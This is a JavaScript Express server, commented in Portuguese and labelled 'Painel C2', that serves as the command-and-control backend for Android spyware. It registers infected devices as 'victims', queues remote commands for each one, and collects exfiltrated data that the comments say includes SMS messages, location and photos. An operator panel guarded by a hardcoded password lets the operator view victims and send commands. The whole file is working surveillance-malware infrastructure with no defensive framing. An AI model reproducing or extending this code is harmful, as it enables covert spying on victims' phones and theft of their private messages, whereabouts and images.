// language: JavaScript, file: server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');

const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

const DB_FILE = path.join(__dirname, 'db.json');
const ADMIN_PASS = "senha123"; // MUDE ISSO

// Helper para ler e salvar o JSON
function getDb() { return JSON.parse(fs.readFileSync(DB_FILE)); }
function saveDb(data) { fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2)); }

// ==========================================
// ROTAS DO PAINEL (ADMIN)
// ==========================================
app.get('/', (req, res) => res.redirect('/login'));

app.get('/login', (req, res) => res.send(`
    <body style="background:#111;color:#fff;font-family:monospace;text-align:center;padding-top:100px;">
        <h2>Painel C2</h2>
        <form action="/dashboard" method="GET">
            <input type="password" name="pw" placeholder="Senha" style="padding:10px;background:#222;border:1px solid #444;color:#fff;">
            <button type="submit" style="padding:10px;background:#f00;color:#fff;border:none;">Entrar</button>
        </form>
    </body>
`));

app.get('/dashboard', (req, res) => {
    if (req.query.pw !== ADMIN_PASS) return res.send("Acesso negado.");
    const db = getDb();
    res.render('dashboard', { victims: db.victims, commands: db.commands });
});

// Enviar comando
app.post('/send-command', (req, res) => {
    if (req.body.pw !== ADMIN_PASS) return res.send("Acesso negado.");
    const { device_id, command } = req.body;
    const db = getDb();
    if (!db.commands[device_id]) db.commands[device_id] = [];
    db.commands[device_id].push(command);
    saveDb(db);
    res.redirect('/dashboard?pw=' + ADMIN_PASS);
});

// ==========================================
// ROTAS DO CLIENTE (APK)
// ==========================================
// 1. APK se registra ou pede comandos
app.post('/api/poll', (req, res) => {
    const { device_id, model, android } = req.body;
    const db = getDb();
    
    // Registra se for novo
    if (!db.victims[device_id]) {
        db.victims[device_id] = { model, android, last_seen: Date.now(), info: {} };
    } else {
        db.victims[device_id].last_seen = Date.now();
    }

    // Pega o próximo comando da fila (se tiver)
    let cmd = null;
    if (db.commands[device_id] && db.commands[device_id].length > 0) {
        cmd = db.commands[device_id].shift(); // remove da fila
    }
    saveDb(db);
    res.json({ command: cmd });
});

// 2. APK manda dados (SMS, localização, foto, etc)
app.post('/api/data', (req, res) => {
    const { device_id, type, data } = req.body;
    const db = getDb();
    if (db.victims[device_id]) {
        db.victims[device_id].info[type] = data;
        db.victims[device_id].last_seen = Date.now();
        saveDb(db);
    }
    res.json({ status: 'ok' });
});

app.listen(3000, () => console.log('C2 rodando na porta 3000'));
